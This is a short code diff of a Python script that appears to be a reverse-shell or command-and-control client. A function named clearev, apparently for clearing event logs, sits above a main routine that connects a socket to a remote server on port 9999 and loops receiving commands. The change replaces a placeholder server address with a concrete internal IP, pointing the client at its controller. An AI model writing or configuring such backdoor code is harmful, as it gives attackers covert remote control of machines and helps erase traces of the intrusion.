@@ -57,7 +57,7 @@ def clearev():
 
 def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect(('server_ip', 9999))
+    client_socket.connect(('10.0.1.33', 9999))
 
     while True:
         command = client_socket.recv(1024).decode('utf-8')
